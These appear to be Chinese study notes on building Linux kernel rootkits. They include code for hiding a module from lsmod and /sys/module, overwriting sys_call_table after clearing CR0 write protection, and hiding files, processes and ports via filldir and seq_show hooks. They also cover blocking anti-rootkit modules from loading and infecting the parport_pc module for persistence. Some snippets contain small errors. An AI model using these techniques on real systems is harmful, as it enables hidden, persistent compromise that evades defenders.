### Linux Rookit 学习

> [caijiqhx 的 Rootkit 实现](https://github.com/caijiqhx/rootkit)

[TOC]

#### [Linux 模块编程和 syscall hook 技巧](https://onestraw.github.io/linux/lkm-and-syscall-hook/)

**Loadable Kernel Module, LKM**

| Item     | 应用编程        | 内核编程                                   |
| :------- | :-------------- | :----------------------------------------- |
| 使用函数 | glibc(如printf) | 内核函数(如printk)                         |
| 头文件   | /usr/include/   | /usr/src/linux-headers-`uname -r`/include/ |
| 编译     | gcc             | Makefile                                   |
| 连接     | gcc             | insmod                                     |
| 运行     | execve          | insmod                                     |
| 调试     | gdb             | kdb                                        |
| 运行权限 | 普通用户        | root                                       |
| 运行空间 | 用户空间        | 内核空间                                   |
| 入口函数 | main()          | module_init()/init_module()                |
| 退出函数 | exit()          | module_exit()/cleanup_module()             |

```makefile
# Makefile example

obj-m += hello_kernel.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

通过 `-C` 选项找到内核源码根目录下的 Makefile

相关命令：

- insmod 状态
- lsmod 查看
- rmmod 卸载
- dmesg 查看输出信息 
- strace 跟踪系统调用

syscall hook 步骤：

1. 使用 SIDT 定位 IDT
2. 通过 IDT 定位系统调用处理例程
3. 扫描寻找并保存系统调用表的位置
4. 关闭写保护，覆盖调用表项

#### Linux 下常见进程隐藏和侦测手段

用户态隐藏

1. 替换进程查看工具 ps, to, lsof；防护手段：hash，系统完整性检测

2. hook 系统调用，如 getdents，libc 中 readdir

3. 利用环境变量 `LD_PRELOAD` 或配置 `ld.so.preload` 加载恶意动态库

   2 3 可以写脚本遍历 /proc 防御

4. 伪造进程名

5. 挂载覆盖，挂在空路径到对应 pid 下，可以查看 `/proc/mount` 挂载情况

内核隐藏，rootkit

1. 劫持 vfs 函数
2. 劫持系统调用，getdents 对应 sys_getdents，readdir 对应 proc_pid_readdir
3. 新增模块，lsmod 查看
4. 劫持进程创建模块代码

#### [Linux Rootkit 系列一：LKM 的基础编写及隐藏](https://www.freebuf.com/articles/system/54263.html)

LKM, Loadable Kernel Modules，可加载内核模块，主要是用来扩展 linux 的内核功能。

一个基本的 LKM：

```c
// lkm.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int lkm_init(void) {
    printk("module loaded");
    return 0;
}
static void lkm_exit(void) {
    printk("module removed");
}

module_init(lkm_init);
module_exit(lkm_exit);
```

`lkm_init` 是初始化函数，模块加载时执行，`lkm_exit` 是清除函数，卸载时执行。

*如果模块未定义清楚函数，则内核不允许卸载该模块。*

内核中使用 `printk` 函数输出，可以通过 `dmesg` 查看输出信息，也可以使用 `KERN_ALERT` 将信息输出到控制台。

```makefile
obj-m := lkm.o

KDIR := /lib/modules/`uname -r`/build
PWD := `shell pwd`

default:
	make -C $(KDIR) M=$(PWD) modules
clean:
	make -C $(KDIR) M=$(PWD) clean
```

使用 `insmod` 命令安装模块，`rmmod` 命令卸载模块，`lsmod` 查看内核模块。

**从 `lsmod` 命令中隐藏我们的模块**

对 `dmesg` 隐藏不输出即可。

`lsmod` 原理：

- 通过 `/proc/modules` 获取当前系统模块信息
- 而 `/proc/modules` 是内核利用 `struct module` 结构体的表头遍历内核模块链表，从所有模块结构体中获取模块信息。

`insmod` 命令实际执行 `init_module` 系统调用，把内核模块插入内核时，模块便与一个  `struct module` 结构体相关联。

所有的内核模块都维护在一个全局链表，链表头是一个全局变量 `struct module *modules`。新创建的模块会从头部插入，通过 `modules->next` 可引用到。

为了对 `lsmod` 隐藏，我们需要在这个链表中删除我们的模块：

```c
list_del_init(&__this_module.list);

// /include/linux/list.h
static inline void list_del_init(struct list_head *entry) {
	__list_del(entry->prev, entry->next);
	INIT_LIST_HEAD(entry);
}
static inline void __list_del(struct list_head * prev, struct list_head * next) {
	next->prev = prev;
	prev->next = next;
}
static inline void INIT_LIST_HEAD(struct list_head *list) {
	list->next = list;
	list->prev = list;
}
```

实现了对 `lsmod` 和 `/proc/modules` 的隐藏

在 `/sys/module` 中还可以发现现有模块，在初始化中添加：

```c
kobj_del(&THIS_MODULE->mkobj.kobj);

// /include/linux/export.h
extern struct module __this_module;
#define THIS_MODULE (&__this_module)

// /lib/kobject.c
void kobject_del(struct kobject *kobj);
```

就可以在 `/sys/module` 中隐藏模块。

#### [Linux Rootkit 系列二：syscall table hook](https://www.freebuf.com/sectool/105713.html)

> 用 virtualbox 别用 vmware！

最简单的 syscall hook 是修改 `sys_call_table`：

```c
asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
	/*
	 * Smells like a compiler bug -- it doesn't work
	 * when the & below is removed.
	 */
	[0 ... __NR_syscall_max] = &sys_ni_syscall,
#include <asm/syscalls_64.h>
};
```

要修改它，先拿到在内存中的位置，然后关闭写保护。

**获取 `sys_call_table` 的内存地址**

1. 暴力搜索内存空间（可能被欺骗

2. 读取 `/boot/System.map` 

3. 使用 `sys_call_table` 的某些未导出函数的机器码进行特征搜索

   1. get IDTR using SIDT

   2. extract the IDT address from the IDTR

   3. get the address of `system_call` from the 0x80th entry of the IDT

      `call <sys_call_table address>(, %eax, 4)` in memory is:

      `0xff 0x14 0x85 0x{sys_call_table address}`

   4. search `system_call` for code fingerprint

4.  `kallsyms_lookup_name("sys_call_table");` 如果这个函数没有导出就不能用。

5. `/proc/kallsyms` 文件

```c
unsigned long **get_sys_call_table(void) {
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;
    for(; (unsinged long)entry < ULONG_MAX; entry += 1) {
        if(entry[__NR_close] == (unsigned long*)sys_close) {
            return entry;
        }
    }
    return NULL;
}
```

`PAGE_OFFSET` 是内核内存空间的起始地址。`sys_close` 是导出函数，可直接得到地址。

**关闭写保护**

找到地址，下面就要关闭下保护。由 `CR0` 寄存器的第 16 位控制。可以使用 `read_cr0/write_cr0` 读写，置位或置零使用 `set_bit/clear_bit`。现在就可以修改调用表了，先保存好原始的再覆盖。

```c
void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

disable_write_protection();
real_open = (void *)sys_call_table[__NR_open];
sys_call_table[__NR_open] = (unsigned long*)fake_open;
real_unlink = (void *)sys_call_table[__NR_unlink];
sys_call_table[__NR_unlink] = (unsigned long*)fake_unlink;
real_unlinkat = (void *)sys_call_table[__NR_unlinkat];
sys_call_table[__NR_unlinkat] = (unsigned long*)fake_unlinkat;
enable_write_protection();

disable_write_protection();
sys_call_table[__NR_open] = (unsigned long*)real_open;
sys_call_table[__NR_unlink] = (unsigned long*)real_unlink;
sys_call_table[__NR_unlinkat] = (unsigned long*)real_unlinkat;
enable_write_protection();
```

#### [Linux Rootkit 系列三：实例讲解 Rootkit 必备的基本功能](https://www.freebuf.com/articles/system/107829.html)

**隐藏文件/进程**

`ls` 通过系统调用 `getdents` 实现文件遍历：

```c
SYSCALL_DEFINE3(getdents, unsigned int, fd,
		struct linux_dirent __user *, dirent, unsigned int, count)
{
	struct fd f;
	struct linux_dirent __user * lastdirent;
	struct getdents_callback buf = {
		.ctx.actor = filldir,
		.count = count,
		.current_dir = dirent
	};
	...
	error = iterate_dir(f.file, &buf.ctx);
    ...
}
```

`filldir` 作为回调函数，后面调用了 `iterate_dir`：

```c
int iterate_dir(struct file *file, struct dir_context *ctx)
{
	...
	if (!IS_DEADDIR(inode)) {
		ctx->pos = file->f_pos;
		if (shared)
			res = file->f_op->iterate_shared(file, ctx);
		else
			res = file->f_op->iterate(file, ctx);
		file->f_pos = ctx->pos;
		fsnotify_access(file);
		file_accessed(file);
	}
    ...
}
```

`iterate` 和 `iterate_shared` 是结构体 `file_operations` 的成员。

`iterate` 在不同的文件系统中有不同的实现，以常见的 `ext4` 为例：

```c
const struct file_operations ext4_dir_operations = {
	...
	.iterate_shared	= ext4_readdir,
	...
};

```

这里只初始化了 `iterate_shared`，**因此在 `ext4` 文件系统下我们应该 hook `iterate_shared` 而不是 `iterate`**。

```c
static int ext4_readdir(struct file *file, struct dir_context *ctx)
{
	...
	if (is_dx_dir(inode)) {
		err = ext4_dx_readdir(file, ctx);
		...
	}
    ...
}

static int ext4_dx_readdir(struct file *file, struct dir_context *ctx)
{
	...
		if (call_filldir(file, ctx, fname))
    ...
}

static int call_filldir(struct file *file, struct dir_context *ctx,
			struct fname *fname)
{
	...
	while (fname) {
		if (!dir_emit(ctx, fname->name,
				fname->name_len,
				fname->inode,
				get_dtype(sb, fname->file_type))) {
			info->extra_fname = fname;
			return 1;
		}
		fname = fname->next;
	}
	return 0;
}

static inline bool dir_emit(struct dir_context *ctx,
			    const char *name, int namelen,
			    u64 ino, unsigned type)
{
	return ctx->actor(ctx, name, namelen, ctx->pos, ino, type) == 0;
}
```

最终，我们看到了熟悉的 `ctx.actor` 即 `filldir`，终于绕回来了。。。

```c
static int filldir(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type)
{
	...
	if (__put_user(d_ino, &dirent->d_ino))
		goto efault;
	if (__put_user(reclen, &dirent->d_reclen))
		goto efault;
	if (copy_to_user(dirent->d_name, name, namlen))
		goto efault;
	if (__put_user(0, dirent->d_name + namlen))
		goto efault;
	if (__put_user(d_type, (char __user *) dirent + reclen - 1))
		goto efault;
	...
}
```

`filldir` 通过 `__put_user` 将内容写入用户空间缓冲区。

调用链为 `sys_getdents->iterate_dir->iterate_shared->[in filesystem]->dir_context.actor(filldir)`，所以要 hook `iterate_shared`，然后修改 `actor`，过滤掉想隐藏的文件。

接下来就是获取 `/` 的 `iterate_shared`，然后直接替换或者用 inline hook，再替换内部的 `filldir`。

隐藏进程就是获取 `/proc` 的 `iterate_shared` 然后 hook，替换 `filldir`。

**隐藏端口**

端口信息也是通过读文件获取。

| 网络类型 |   对应/proc    |    内核源码文件     | 主要实现函数  |
| :------: | :------------: | :-----------------: | :-----------: |
| TCP/IPv4 | /proc/net/tcp  | net/ipv4/tcp_ipv4.c | tcp4_seq_show |
| TCP/IPv6 | /proc/net/tcp6 | net/ipv6/tcp_ipv6.c | tcp6_seq_show |
| UDP/IPv4 | /proc/net/udp  |   net/ipv4/udp.c    | udp4_seq_show |
| UDP/IPv6 | /proc/net/udp6 |   net/ipv6/udp.c    | udp6_seq_show |

这里也没弄清具体的调用链是从哪开始的，最后就是要 hook `tcp_seq_afinfo->seq_operations->show->tcp4_seq_show` ，获取这个函数的地址还是需要通过获取文件句柄在找到对应结构体。

**控制内核模块加载**

进来之后先把门堵上，避免其他程序（Anti-Rootkit、其他 Rootkit）进来。

控制内核模块的加载，从 `通知链` 机制开始：某个子系统或模块发生某个事件时，该子系统主动遍历某个链表，链表中记录着其他子系统或模块注册的事件处理函数，通过传递恰当的参数调用这个处理函数达到事件通知的目的。

注册一个模块通知处理函数，模块加载完成、开始初始化之前，即状态为 `MODULE_STATE_COMING`，将其初始函数替换，就达到了阻止模块加载的目的。

`insmod` 时调用了 `finit_module` 系统调用，	还有个 `init_module`，区别就是前者从文件加载，后者从 `module_image` 加载。区别就是把模块复制到内核区的操作：

```c
// init_module
err = copy_module_from_user(umod, len, &info);
// finit_module
err = kernel_read_file_from_fd(fd, &hdr, &size, INT_MAX, READING_MODULE);
```

读到内核区后交给 `load_module`，先各种检测，后准备执行：

```c
	/* Finally it's fully formed, ready to start executing. */
	err = complete_formation(mod, info);
	if (err)
		goto ddebug_cleanup;

	err = prepare_coming_module(mod);
	if (err)
		goto bug_cleanup;

```

进入 `prepare_coming_module`：

```c
static int prepare_coming_module(struct module *mod)
{
	int err;

	ftrace_module_enable(mod);
	err = klp_module_coming(mod);
	if (err)
		return err;

	blocking_notifier_call_chain(&module_notify_list,
				     MODULE_STATE_COMING, mod);
	return 0;
}
```

相当于内核告诉通知链的处理函数 `MODULE_STATE_COMING`，我们要做的就是替换处理函数中的模块出口入口：

```c
ret = notifier_call_chain(&nh->head, val, v, nr_to_call, nr_calls);
```

进入 `notifier_call_chain`：

```c
ret = nb->notifier_call(nb, val, v);
```

描述通知处理函数的结构体是 `struct notifier_block`，这可以从负责注册/注销模块通知处理函数的函数中看到：

```c
static BLOCKING_NOTIFIER_HEAD(module_notify_list);

int register_module_notifier(struct notifier_block *nb)
{
	return blocking_notifier_chain_register(&module_notify_list, nb);
}
int unregister_module_notifier(struct notifier_block *nb)
{
	return blocking_notifier_chain_unregister(&module_notify_list, nb);
}
```

具体的注册跟进太麻烦了，索性先不看了。

```c
typedef	int (*notifier_fn_t)(struct notifier_block *nb,
			unsigned long action, void *data);

struct notifier_block {
	notifier_fn_t notifier_call;
	struct notifier_block __rcu *next;
	int priority;
};
```

通知链就是个单链表，`notifier_call` 为处理函数，`next` 为指针，`priority` 为优先级。

下面我们就要写一个通知处理函数，然后填充一个结构体，`notifier_call` 指向自定义的 `module_handler` 函数，其中替换模块的 出口入口函数。``priority` 设置为 `INT_MAX` 保证最先运行。

#### [Linux Rootkit 系列五：感染系统关键内核模块实现持久化](https://www.freebuf.com/articles/system/109034.html)

基于链接与修改符号表感染并劫持目标内核模块的初始与退出函数，使其成为寄生的宿主，实现隐蔽与持久性。

模块的编译过程：源文件编译成 `*.o`，然后编译器再生成一个 `.mod.c`，编译后再链接到一起。

```c
// noinj.mod.c
__visible struct module __this_module
__attribute__((section(".gnu.linkonce.this_module"))) = {
	.name = KBUILD_MODNAME,
	.init = init_module,
#ifdef CONFIG_MODULE_UNLOAD
	.exit = cleanup_module,
#endif
	.arch = MODULE_ARCH_INIT,
};
```

我们使用宏 `module_init/module_exit` 将自定义的入口/出口函数注册为 `init_module/cleanup_module`：

```c
/* Each module must use one module_init(). */
#define module_init(initfn)					\
	static inline initcall_t __maybe_unused __inittest(void)		\
	{ return initfn; }					\
	int init_module(void) __attribute__((alias(#initfn)));

/* This is only required if you want to be unloadable. */
#define module_exit(exitfn)					\
	static inline exitcall_t __maybe_unused __exittest(void)		\
	{ return exitfn; }					\
	void cleanup_module(void) __attribute__((alias(#exitfn)));
```

查看重定位记录 `readelf -r noinjko.ko`，包含 `init_module/cleanup_module` 符号：

```
重定位节 '.rela.gnu.linkonce.this_module' 位于偏移量 0x40d8 含有 2 个条目：
  偏移量          信息           类型           符号值        符号名称 + 加数
000000000178  003800000001 R_X86_64_64       0000000000000000 init_module + 0
000000000308  003000000001 R_X86_64_64       0000000000000030 cleanup_module + 0
```

结合符号表 `readelf -s noinjko.ko`：

```
    56: 0000000000000000    46 FUNC    GLOBAL DEFAULT    2 init_module
    66: 0000000000000060    79 FUNC    GLOBAL DEFAULT    2 fake_init
    72: 0000000000000000    46 FUNC    GLOBAL DEFAULT    2 noinj_init
```

可见，`init_module` 与真实的初始化函数 `noinj_init` 值相同。那么我们如果能把 `init_module` 的值改为 `fake_init` 的值，在模块加载进行符号解析、重定位时，就会执行 `fake_init`。

使用 `setsym` 工具修改符号表：

```
setsym <module_path> <symbol_name>
setsym <module_path> <symbol_name> <symbol_value>
```

修改模块中 `init_module/cleanup_module` 的符号值即可执行 `fake_init/fake_exit`。

以上实现了同模块入口出口劫持，下面我们希望能用一个模块（我们的 Rootkit）的入口出口函数替换另一个模块（内核自动加载模块）的入口出口函数。

使用 `rootkit` 作为实例，其入口出口函数为 `init_rootkit/cleanup`，`codeinj`作为目标模块，入口出口函数为 `codeinj_init/codeinj_exit`。注意，寄生模块不要使用 `module_init/module_exit` 宏，否则在链接时无法成功。

**感染系统中的内核模块**

在 `lsmod` 里找一个未使用的模块，没找到文章里讲的 `video`，随便换一个 `parport_pc` 看行不行：

```c
// driviers/parport/parport_pc.c
module_init(parport_pc_init)
module_exit(parport_pc_exit)
```

准备讲 `rootkit` 感染到其中：

```
// rootkit.c
extern int parport_pc_init(void);
extern void parport_pc_exit(void);

__init init_rootkit(void) {
	parport_pc_init();
	...
}
__exit cleanup_rootkit(void) {
	...
	parport_pc_exit();
}
```

